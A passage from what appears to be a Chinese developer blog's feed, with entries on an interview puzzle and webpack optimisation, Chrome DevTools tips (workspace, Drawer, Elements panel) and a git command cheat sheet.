这样的话,最多只要20次</p></blockquote><p>然后又说给我三个球,在1000米的高楼,判断多少次…但是根据我上面的话,</p><blockquote><p>开立方, <img src="/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB/index/img_1.png"> , 那最多不超过30次;</p></blockquote><p>至于第一次丢球的位置如何确定, 就是开平之后的值作为一个区间.</p><p>若 N 个球和 M 米的大厦…第一次丢球的高度区间就是这个了 <img src="/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB/index/img_2.png"></p><p>面试大佬说这个还可以…那就暂且告一段落</p><p>…回来用万能的搜索引擎找了下..最优方案+最少次数需要考虑的东西很多,没那么简单</p><p>传送门: <a href="https://www.zhihu.com/question/31855632">知乎有人讨论了这个问题</a>;</p><p>但是高数还老师了..这种帖子看的一脸懵逼….抽空再好好研究下</p><h2 id="Q-webpack-是什么-webpack-常见的优化手段有哪些"><a href="#Q-webpack-是什么-webpack-常见的优化手段有哪些" class="headerlink" title="Q: webpack 是什么?webpack 常见的优化手段有哪些;"></a>Q: webpack 是什么?webpack 常见的优化手段有哪些;</h2><p>webpack 是一个资源处理工具,它的出现节省了我们的人力和时间;可以对资源打包,解析,区分开发模式等等…</p><p>常见的优化手段:</p><ul><li>分离第三方库(依赖),比如引入dll</li><li>引入多进程编译,比如happypack</li><li>提取公共的依赖模块,比如commonChunkPlugin</li><li>资源混淆和压缩:比如UglifyJS</li><li>分离样式这些,减小bundle chunk的大小,比如ExtractTextPlugin</li><li>GZIP 压缩,在打包的时候对资源对齐压缩,只要部署的服务器能解析即可..减少请求的大小</li><li>还有按需加载这些,一般主流的框架都有对应的模块懒加载方式.</li><li>至于tree shaking目前webpack3&#x2F;4已经默认集成</li></ul>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>14丨THE LAST</title>
      <link href="/Blog/2019/03/28/chrome_debug/14%E4%B8%A8THE_LAST/index/"/>
      <url>/Blog/2019/03/28/chrome_debug/14%E4%B8%A8THE_LAST/index/</url>
      
        <content type="html"><![CDATA[<p>如果我用一句话来总结所有的 <code>Tips</code> 的话，读起来像是这样：</p><p><em>“DevTools是一款功能强大的软件，很容易被忽视， 它隐藏着许多我们甚至常常怀疑是否需要的那些功能”</em></p><p>好吧，那是两句话，无论如何，学无止境，最后也推荐给大家几个优质的内容</p><h3 id="1-Google-Chrome-Developers"><a href="#1-Google-Chrome-Developers" class="headerlink" title="1. Google Chrome Developers"></a>1. Google Chrome Developers</h3><p>高度推荐你订阅 <code>Google Chrome Developers</code> 的 <code>YouTube</code> 频道，这是在 <code>Chrome</code> 中展示已有的新内容的地方。 不仅如此，你还可以去那里寻找有关最佳实践，<code>JavaScript</code> 演变等的讨论。对于任何一位前端开发人员来说，这里都有许多有价值的内容。</p><p><a href="https://www.youtube.com/channel/UCnUYZLuoy1rq1aVMwx4aTzw">Google Chrome Developers - YouTube</a></p><h2 id="2-Developers-google-com"><a href="#2-Developers-google-com" class="headerlink" title="2. Developers.google.com"></a>2. <a href="https://developers.google.com/">Developers.google.com</a></h2><p>当我在撰写这个系列时，除了分享最喜欢的功能和技术积累之外，也在查阅 <a href="https://developers.google.com/">Developers.google.com</a>，你可以 （“按年”）或 技术（“按标签”）去查询一些有关特定更新的信息，例如关于最近发布的 <code>Chrome 71</code> ：</p><p><a href="https://developers.google.com/web/updates/2018/12/nic71">New in Chrome 71</a></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>13丨workspace 技巧</title>
      <link href="/Blog/2019/03/26/chrome_debug/13%E4%B8%A8workspace%E6%8A%80%E5%B7%A7/index/"/>
      <url>/Blog/2019/03/26/chrome_debug/13%E4%B8%A8workspace%E6%8A%80%E5%B7%A7/index/</url>
      
        <content type="html"><![CDATA[<p>我们总是习惯于先在 <code>IDE</code> 或者文本编辑器中修改代码，然后再进入 <code>Chorme</code> 中进行调试，那有没有想过直接就在 <code>Chrome</code> 中来修改我们的代码呢？ 对于这样的想法，<code>Chrome DevTools</code> 提供了哪些支持呢？</p><h3 id="1-在-Chrome-中修改你的文件"><a href="#1-在-Chrome-中修改你的文件" class="headerlink" title="1. 在 Chrome 中修改你的文件"></a>1. 在 <code>Chrome</code> 中修改你的文件</h3><p>有时在代码执行的位置也是最容易编辑代码的位置（对于前端来说也就是浏览器）。如果你把项目的文件夹直接拖到 <code>Source</code> 面板，<code>DevTools</code> 会将你做出的修改同步到系统的文件中。</p><p>这对于快速修复代码非常方便！（我真的认识一个喜欢以这种方式做大部分编码的开发者）</p><p><img src="/Blog/2019/03/26/chrome_debug/13%E4%B8%A8workspace%E6%8A%80%E5%B7%A7/index/img.gif"></p><p>等等，其实它可以更好…</p><h3 id="2-Workspace-支持即时同步样式"><a href="#2-Workspace-支持即时同步样式" class="headerlink" title="2. Workspace 支持即时同步样式"></a>2. <code>Workspace</code> 支持即时同步样式</h3><p>正如我们刚才所说，一旦设置好了 <code>DevTools workspace</code>，就可以在 <code>Sources</code> 面板中编辑 <code>HTML</code> 和 <code>JavaScript</code>（或者甚至是 <code>TypeScript</code>，如果你有<code>sourcemaps</code>）文件，按 <code>ctrl + s</code> 后它将被保存 在文件系统中。</p><p>但是在样式方面它提供了更好的支持。 因为即使你只是在 <em>“元素”</em> 面板的 <em>“样式”</em> 部分中编辑样式规则，它也会立即同步。 请注意，是立刻！</p><p><img src="/Blog/2019/03/26/chrome_debug/13%E4%B8%A8workspace%E6%8A%80%E5%B7%A7/index/img_1.gif"></p><p><strong>“黑魔法!”</strong></p><h3 id="3-为新选择器选择目标位置"><a href="#3-为新选择器选择目标位置" class="headerlink" title="3. 为新选择器选择目标位置"></a>3. 为新选择器选择目标位置</h3><p>如果要向现有选择器添加新样式，很容易：只需在 <code>“元素”</code> 面板的 <code>“样式”</code> 部分中找到该选择器，然后开始编写 <code>CSS</code>。 但如果还没有这样的选择器，则需要按下<code>New Style Rule</code> 按钮。</p><p>当你使用工作区时，新样式规则的默认定位为 - <code>“inspector-stylesheet：1”</code> 如果你不想规则在这个位置显示，只需按住 <code>New Style Rule</code> 按钮，就可以看到一个列出所有 <code>CSS</code> 文件的选项。选择目的地，新规则就会保存在那里！</p><p><img src="/Blog/2019/03/26/chrome_debug/13%E4%B8%A8workspace%E6%8A%80%E5%B7%A7/index/img.webp"></p><h3 id="4-Workspace-允许-CSS-注入！"><a href="#4-Workspace-允许-CSS-注入！" class="headerlink" title="4. Workspace 允许 CSS 注入！"></a>4. <code>Workspace</code> 允许 <code>CSS</code> 注入！</h3><p>设置工作区后，浏览器中所做的更改不仅会持久的保存到文件系统中，而且，<code>CSS</code> 的更改保存在文件系统后，立即就被浏览器选中并显示在你的页面上。<strong>并不需要手动刷新。</strong></p><p>敲黑板：我们 <code>没有使用额外的工具</code> - 没有 <code>webpack</code> 的热更新模块或者其他东西 - 只有一个本地服务以及 <code>DevTools&#39; workspace</code> 而已。</p><p><img src="/Blog/2019/03/26/chrome_debug/13%E4%B8%A8workspace%E6%8A%80%E5%B7%A7/index/img_2.gif"></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git 操作指南</title>
      <link href="/Blog/2019/03/24/shell/git%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/index/"/>
      <url>/Blog/2019/03/24/shell/git%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/index/</url>
      
        <content type="html"><![CDATA[<p>查看配置</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git config <span class="attr">--global</span> <span class="attr">--list</span></span><br><span class="line"><span class="comment">// 可选参数 </span></span><br><span class="line"><span class="attr">--global</span>(有所仓库)</span><br><span class="line"><span class="attr">--local</span>(当前仓库) </span><br><span class="line"><span class="attr">--system</span>(当前系统登陆用户)</span><br></pre></td></tr></table></figure><p>设置名字、邮箱</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config <span class="attr">--global</span> user<span class="selector-class">.name</span> <span class="string">&#x27;yourName&#x27;</span></span><br><span class="line">git config <span class="attr">--blobal</span> user<span class="selector-class">.email</span> <span class="string">&#x27;email@domin.com&#x27;</span></span><br></pre></td></tr></table></figure><p>给文件重命名的简便方法</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git mv <span class="keyword">fileName</span> <span class="keyword">fileName</span></span><br></pre></td></tr></table></figure><p>查看日志</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span><span class="comment"></span></span><br><span class="line"><span class="comment">// 只查看简单的log</span></span><br><span class="line">git <span class="built_in">log</span> <span class="comment">--oneline</span><span class="comment"></span></span><br><span class="line"><span class="comment">// 查看最近几次log</span></span><br><span class="line">git <span class="built_in">log</span> -n5<span class="comment"> // 可组合 git log -n5 --online</span><span class="comment"></span></span><br><span class="line"><span class="comment">// 查看所有记录包括其他分支</span></span><br><span class="line">git <span class="built_in">log</span> <span class="comment">--all</span><span class="comment"></span></span><br><span class="line"><span class="comment">// 图形化</span></span><br><span class="line">git <span class="built_in">log</span> <span class="comment">--all praph</span></span><br></pre></td></tr></table></figure><p>分支</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 创建分支</span><br><span class="line">git branch &lt;name&gt;</span><br><span class="line"><span class="regexp">//</span> 创建分支并切换</span><br><span class="line">git checkout -b &lt;name&gt;</span><br><span class="line"><span class="regexp">//</span> 查看所有本地分支</span><br><span class="line">git branch</span><br><span class="line"><span class="regexp">//</span> 查看所有远程分支</span><br><span class="line">git branch -r</span><br><span class="line"><span class="regexp">//</span> 查看有本地分支和远程分支</span><br><span class="line">git branch -a （详细信息 -av）</span><br><span class="line"><span class="regexp">//</span> 删除分支</span><br><span class="line">git branch -d &lt;name&gt; （强制-D）</span><br></pre></td></tr></table></figure><p>变更记录</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">工作区和暂存区的不同</span><br><span class="line">git <span class="keyword">diff </span>(-- 文件名 [比较某几个文件差异，用空格分隔])（或者直输入分支，比较分支所有差异，后面也可以继续跟 -- fileName 查看某个文件）（或者某两次提交的git编码）</span><br><span class="line">暂存区和 head 比较</span><br><span class="line">git <span class="keyword">diff </span>--<span class="keyword">cached</span></span><br><span class="line"><span class="keyword"></span>和上 `<span class="number">1</span>` 次比较</span><br><span class="line">git <span class="keyword">diff </span>HEAD HEAD^<span class="number">1</span> （或 HEAD~<span class="number">1</span>）</span><br></pre></td></tr></table></figure><p>修改上一次的commit</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">commit</span> <span class="comment">--amend</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 修改旧的<span class="keyword">commit</span></span><br><span class="line">git rebase <span class="operator">-</span>i 想修改的上一次<span class="keyword">commit</span>编码</span><br><span class="line">把pick改成reword，只修改<span class="keyword">commit</span> message， 退出git就会自动提交。</span><br></pre></td></tr></table></figure><p>恢复</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">恢复到 HEAD 的内容</span><br><span class="line">git reset <span class="comment">--head HEAD (加上&lt;-- fileName&gt;恢复单个文件，不加恢复所有)</span></span><br><span class="line">让暂存区恢复成和HEAD的一样（取消git <span class="built_in">add</span> ...）</span><br><span class="line">git reset HEAD (加上&lt;<span class="comment">-- fileName&gt;恢复单个文件，不加恢复所有)</span></span><br><span class="line">让工作区恢复到 暂存区 的内容</span><br><span class="line">git checkout <span class="comment">-- 文件名</span><span class="comment"></span></span><br><span class="line"><span class="comment">// 恢复到某次提交</span></span><br><span class="line">git reset <span class="comment">--hard 提交编码</span></span><br></pre></td></tr></table></figure><p>临时仓库</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">停止目前的修改，恢复到上一次状态</span><br><span class="line">git stash</span><br><span class="line">恢复到临时仓库</span><br><span class="line">git stash pop <span class="comment">(恢复并在临时仓库中删除)</span> git stash apply <span class="comment">(恢复并在临时仓库中保留)</span></span><br><span class="line">临时仓库列表 </span><br><span class="line">git stash list</span><br></pre></td></tr></table></figure><hr>ps：<p>linux命令复制一个文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cp</span> ./<span class="keyword">file</span> ./<span class="keyword">file</span></span><br><span class="line"><span class="keyword">ls</span> -<span class="keyword">al</span> 查看所有文件详细信息 </span><br><span class="line"><span class="keyword">ll</span> 同上，除隐藏文件外</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12丨Drawer 常识</title>
      <link href="/Blog/2019/03/24/chrome_debug/12%E4%B8%A8Drawer%E5%B8%B8%E8%AF%86/index/"/>
      <url>/Blog/2019/03/24/chrome_debug/12%E4%B8%A8Drawer%E5%B8%B8%E8%AF%86/index/</url>
      
        <content type="html"><![CDATA[<p>说到 <code>Drawer</code> 大部分的朋友可能都很陌生，那 <code>Drawer</code> 是个什么东西？ <code>Chrome DevTools</code> 有很多部分，被分为9个 <code>tab</code> (俗称选项卡) ( <code>Elements</code> ， <code>Console</code> ， <code>Sources</code> ， <code>Network</code> ， 等等…)</p><p>但是，那仅仅是它的一部分而已！有一组平行的选项卡，被隐藏在主窗口之下。这个组合被称为 <strong><code>Drawer</code></strong></p><h3 id="1-如何打开-Drawer"><a href="#1-如何打开-Drawer" class="headerlink" title="1. 如何打开 Drawer ?"></a>1. 如何打开 <code>Drawer</code> ?</h3><p>当你在 <code>DevTools</code>（任何选项卡）中时，按 <code>[esc]</code> 来显示它，再次按 <code>[esc]</code> 隐藏它：</p><p><img src="/Blog/2019/03/24/chrome_debug/12%E4%B8%A8Drawer%E5%B8%B8%E8%AF%86/index/img.webp"></p><p>默认情况下，您会看到一个 <code>console</code> 选项卡。 与主面板的 <code>console</code> 完全相同。 这就是为什么主面板会显示除了 <code>console</code> 之外的每个主要标签（ <code>Elements</code> ，<code>Sources</code> ，<code>Network</code> …）- 因为在主面板中显示 <code>console</code> 没有意义。</p><p>这样的 <code>console</code> 很方便，例如在 <code>Elements</code> 选项卡打开时，我们同时可以看到 <code>console</code> 面板。但是在 <code>Drawer</code> 中其实还隐藏了更多细节。</p><h3 id="2-Drawer-里面到底有什么？"><a href="#2-Drawer-里面到底有什么？" class="headerlink" title="2. Drawer 里面到底有什么？"></a>2. <code>Drawer</code> 里面到底有什么？</h3><p><code>Drawer</code> 里隐藏着许多其他功能，大多数时候你可能不需要用到它们，这也是它们为什么被隐藏起来的原因，然鹅，你可以直接选择你想展示在这里的功能。</p><p>点击主页面在 <code>Drawer</code>的 <code>console</code> 面板前面的 <code>⋮</code> 图标来打开完整选项列表。另外，你也可以打开之前我们提到的 <code>command Menu</code> ，然后输入 <code>Drawer</code> 来打开</p><p><img src="/Blog/2019/03/24/chrome_debug/12%E4%B8%A8Drawer%E5%B8%B8%E8%AF%86/index/img_1.webp"></p><p>Okay，让我们再看一遍所有的选项：</p><ul><li><code>Animations</code></li><li><code>Changes</code></li><li><code>Console</code></li><li><code>Coverage</code></li><li><code>Network conditions</code></li><li><code>Performance monitor</code></li><li><code>Quick source</code></li><li><code>Remote devices</code></li><li><code>Rendering</code></li><li><code>Request blocking</code></li><li><code>Search</code></li><li><code>Sensors</code></li><li><code>What’s new</code></li></ul><h3 id="3-控制传感器"><a href="#3-控制传感器" class="headerlink" title="3. 控制传感器"></a>3. 控制传感器</h3><p>如果你正在你的应用中使用一些获取位置信息的 <code>API</code> 而且想要测试一下它，总不能开着车环绕世界吧，(其实也不是不行😉)。</p><p><code>Drawer</code> 里的 <code>Sensors(传感器)</code> 面板可以让你模拟特定的位置: 支持从预定义的位置中进行选择，添加自己的位置，或者手动键入纬度&#x2F;经度。选定的值将被 <code>navigator.geolocation.watchPosition</code>（或 <code>.getCurrentPosition</code> ）报告。</p><p>如果你的 <code>App</code> 使用加速计，传感器面板也可以模拟你设备在3D空间中的位置！</p><p><img src="/Blog/2019/03/24/chrome_debug/12%E4%B8%A8Drawer%E5%B8%B8%E8%AF%86/index/img.gif"></p><h3 id="4-模拟网络状态"><a href="#4-模拟网络状态" class="headerlink" title="4 .模拟网络状态"></a>4 .模拟网络状态</h3><p>就像伪造你的位置一样，你可以使用 <code>Drawer</code> 里的 <code>Network conditions</code> 面板模拟特定的网络行为：模拟互联网为典型的3G网络甚至离线！ 这通常用来了解页面资源的大小。或者测试应用的离线功能。 除此之外，<code>Network conditions</code> 面板还可以模拟特定的用户代理。</p><p><img src="/Blog/2019/03/24/chrome_debug/12%E4%B8%A8Drawer%E5%B8%B8%E8%AF%86/index/img_1.gif"></p><h3 id="5-拿到-source"><a href="#5-拿到-source" class="headerlink" title="5.拿到 source"></a>5.拿到 <code>source</code></h3><p>与 <code>drawer console</code> 一样，当我要专注于 <code>Elements</code> 面板时，有时我也想看源代码，这时就可以在 <code>drawer</code> 中选择显示 <code>Source</code>。</p><p><img src="/Blog/2019/03/24/chrome_debug/12%E4%B8%A8Drawer%E5%B8%B8%E8%AF%86/index/img.png"></p><p>如你所见，或许没有 <code>“主”Source</code> 面板的花里胡哨的功能，没有 <code>call stack</code> 或者 <code>control</code> ( <code>pause</code>， <code>step over</code>， 等等)按钮。而且如果断点被触发，它也不会显示在 <code>drawer</code> 的 <code>Quick sources</code> 中，而是显示在主 <code>Source</code> 中。</p><p>但是对于 <code>快速查看代码</code> ，或者 <code>设置断点</code> 来说，它却是非常有用的技巧。</p><h3 id="6-检查代码-coverage"><a href="#6-检查代码-coverage" class="headerlink" title="6. 检查代码 coverage"></a>6. 检查代码 coverage</h3><p>实际开发中，你的页面可能并不需要位于尾部的许多代码。也许那是来自外部库的一大块 <code>JavaScript</code> ，也许是被遗忘的选择器上的一些 <code>CSS</code> 规则，它们不再匹配任何东西。</p><p>使用 <code>coverage</code> 面板来获得关于冗余代码的摘要-细节信息。使用 <code>Drawer</code> 菜单或者 <code>Command</code> 菜单来打开它。</p><p><img src="/Blog/2019/03/24/chrome_debug/12%E4%B8%A8Drawer%E5%B8%B8%E8%AF%86/index/img_2.webp"></p><p><code>DevTools</code> 的 <code>coverage</code> 工具可以跟踪当前加载的 <code>JS</code> 和 <code>CSS</code> 文件的 <code>哪些行正在被执行</code> ，并显示 <code>未使用字节的百分比</code> 。</p><p>它用 <code>绿色</code> 的线条标记 <code>运行</code> 和用 <code>红色</code> 的线条标记 <code>未运行</code> 。 举个例子：</p><p><img src="/Blog/2019/03/24/chrome_debug/12%E4%B8%A8Drawer%E5%B8%B8%E8%AF%86/index/img_2.gif"></p><h3 id="7-检查你修改的内容"><a href="#7-检查你修改的内容" class="headerlink" title="7. 检查你修改的内容"></a>7. 检查你修改的内容</h3><p>通过浏览器进行设计和调整 <code>css</code> ：能够在代码执行的地方进行调试是方便又有趣的开发方式。 但在某些时候，你可能希望将 <code>已更改的内容</code> 与 <code>最初加载的样式表</code> 进行比较。</p><p>为此，可以使用 <code>DevTools&#39; Drawer</code> 中的更改工具。</p><p><img src="/Blog/2019/03/24/chrome_debug/12%E4%B8%A8Drawer%E5%B8%B8%E8%AF%86/index/img_1.png"></p><p>它不仅会使用差异形式的变化（像 <code>Git</code> 这样的源控制工具一样）向你展示，同时还可以撤销它们。</p><p>举个例子：</p><p><img src="/Blog/2019/03/24/chrome_debug/12%E4%B8%A8Drawer%E5%B8%B8%E8%AF%86/index/img_3.gif"></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11丨元素面板中的技巧</title>
      <link href="/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/"/>
      <url>/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/</url>
      
        <content type="html"><![CDATA[<h3 id="1-通过-39-h-39-来隐藏元素"><a href="#1-通过-39-h-39-来隐藏元素" class="headerlink" title="1. 通过 &#39;h&#39; 来隐藏元素"></a>1. 通过 <code>&#39;h&#39;</code> 来隐藏元素</h3><p>按一下 <code>&#39;h&#39;</code> 就可以隐藏你在元素面板中选择的元素。再次按下 ‘<code>h</code>‘ 可以使它出现。某些的时候这很有用：例如你想截图，但你想去掉里面的敏感信息。</p><p><img src="/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/img.gif"></p><h3 id="2-拖动-amp-放置-元素"><a href="#2-拖动-amp-放置-元素" class="headerlink" title="2. 拖动 &amp; 放置 元素"></a>2. 拖动 &amp; 放置 元素</h3><p>当你想看看页面的某一部分在 <code>DOM</code> 树的不同位置的显示效果时，只需要拖动放置它(到指定的位置)，就像在机器上的其他任何地方一样 :-)</p><p><img src="/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/img.webp"></p><h3 id="3-使用-control-按钮-来移动元素"><a href="#3-使用-control-按钮-来移动元素" class="headerlink" title="3. 使用 control (按钮) 来移动元素!"></a>3. 使用 <code>control</code> (按钮) 来移动元素!</h3><p>如果你只是想移动你当前选中的元素，在 <code>DOM</code> 结构中往上挪一点或者往下挪一点，而不是拖动和放置，你同样可以使用<code>[ctrl]</code> + <code>[⬆]</code> &#x2F; <code>[ctrl]</code> + <code>[⬇]</code> (<code>[⌘]</code> + <code>[⬆]</code> &#x2F; <code>[⌘]</code> + <code>[⬇]</code> on Mac).</p><p><img src="/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/img_1.gif"></p><h3 id="4-元素面板中类似于基础编辑器的操作"><a href="#4-元素面板中类似于基础编辑器的操作" class="headerlink" title="4. 元素面板中类似于基础编辑器的操作"></a>4. 元素面板中类似于基础编辑器的操作</h3><p>从某一点来看，我们可以拖动，放置，编辑，复制(当然，以及使用 <code>[ctrl]</code> + <code>[v]</code> 来粘贴)， 所以我们可以在元素面板里把 <code>HTML</code> 结构搞得一团糟。在任意一个编辑器中都有一个标准，那么如何撤回你的操作呢？</p><p><strong>使用<code>[ctrl]</code> + <code>[z]</code> (<code>[⌘]</code> + <code>[z]</code> on Mac)撤销我们的任何改动。 使用 <code>[ctrl]</code> + <code>[shift]</code> + <code>[z]</code>重新编辑我们的任何修改。</strong></p><p><img src="/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/img_2.gif"></p><h3 id="5-Shadow-editor-阴影编辑器"><a href="#5-Shadow-editor-阴影编辑器" class="headerlink" title="5. Shadow editor 阴影编辑器"></a>5. <code>Shadow editor</code> 阴影编辑器</h3><p>听起来很不吉利(译者注：阴影哪里不吉利了！)，但是它也只是一个小部件而已。你可以通过在 <code>Style</code> 面板中点击靠近 <code>box-shadow</code> 属性或者 <code>text-shadow</code> 属性的 <code>阴影方形符号</code> 来打开它：</p><p><img src="/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/img_1.webp"></p><h3 id="6-Timing-function-editor-定时函数编辑器"><a href="#6-Timing-function-editor-定时函数编辑器" class="headerlink" title="6. Timing function editor 定时函数编辑器"></a>6. Timing function editor 定时函数编辑器</h3><p>也称为 <code>Cubic bezier(贝塞尔)</code> 编辑器。贝塞尔曲线是一串用来定义 <code>CSS</code> 的动画速度在整个动画过程中如何变化的 <code>魔法数值</code> 。我们将其定义为 <code>transition-timing-function</code> 或者 <code>animation-timing-function</code> CSS 属性。</p><p>像之前说的 <code>Color picker</code> 和 <code>Shadow editor</code> 一样，直接点击我们刚刚提到的属性(或者他们的简写形式：<code>trasition</code>， <code>animation</code> - 请注意：如果<code>timing</code> 函数的值没有设置在这个简写的形式中，这个符号不会显示出来)边上的曲线符号：</p><p><img src="/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/img_3.gif"></p><blockquote><p>顺带说一句，如果你没有试过 <code>3D</code> 动画，也很简单：直接在容器元素中设置一个 <code>perspective</code> 属性。例如：在 <code>body</code> 元素中设置 <code>perspective: 200px;</code></p></blockquote><h3 id="7-插入样式规则的按钮"><a href="#7-插入样式规则的按钮" class="headerlink" title="7. 插入样式规则的按钮"></a>7. 插入样式规则的按钮</h3><p>当你把鼠标放在样式选择器的选择区域的最后时，你会看到几个让你可以快速的使用 <code>Color</code> 和 <code>Shadow</code> 编辑器添加 <code>CSS</code> 属性的按钮：</p><ul><li><code>text-shadow</code></li><li><code>box-shadow</code></li><li><code>color</code></li><li><code>background-color</code></li></ul><p>…打开相应的编辑器：</p><p><img src="/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/img_2.webp"></p><h3 id="8-在元素面板中展开所有的子节点"><a href="#8-在元素面板中展开所有的子节点" class="headerlink" title="8. 在元素面板中展开所有的子节点"></a>8. 在元素面板中展开所有的子节点</h3><p>一个一个的去点击级联的 <code>▶</code> 按钮太慢了，不如使用右击节点后的 <code>expand recursively</code> 命令：</p><p><img src="/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/img_3.webp"></p><h3 id="9-DOM-断点"><a href="#9-DOM-断点" class="headerlink" title="9. DOM 断点"></a>9. DOM 断点</h3><p>有时脚本修改了 <code>DOM</code> ，但修改的是哪部分？什么时候修改的呢？</p><p>这样的情况下，你就可以添加一个 <code>DOM</code> 断点：监听节点被添加或者移除 &#x2F; 属性被改变。</p><ul><li><p>点击”…” 符号或者右击你想添加监听的元素</p></li><li><p>选择 <code>subtree modifications</code> :监听任何它内部的节点被 <code>移除</code> 或者 <code>添加</code>的事件</p></li><li><p>选择 <code>attribute modifications</code> :监听任何当前选中的节点被 <code>添加</code>，<code>移除</code> 或者 <code>被修改值</code>的事件</p></li><li><p>选择 <code>node removal</code> :监听被选中的元素被 <code>移除</code> 的事件</p></li></ul><p><img src="/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/img.png"></p><p>页面重新加载时会记住断点。当你设置了一个或多个断点的时候，可能都忘了它们所标记的位置了。怎么找它们呢？：在 <code>Elements</code> 视图中有视觉提示，<code>Sources</code> 中也有专用列表。</p><p>有时你添加了断点的元素被隐藏在一些折叠起来的父级元素中，不要担心 - 他们会在 <code>Element</code> 中用高亮展示出来。</p><p><img src="/Blog/2019/03/22/chrome_debug/11%E4%B8%A8%E5%85%83%E7%B4%A0%E9%9D%A2%E6%9D%BF%E4%B8%AD%E7%9A%84%E6%8A%80%E5%B7%A7/index/img_1.png"></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一起搞懂 CSS 水平居中与垂直居中的16个方法</title>
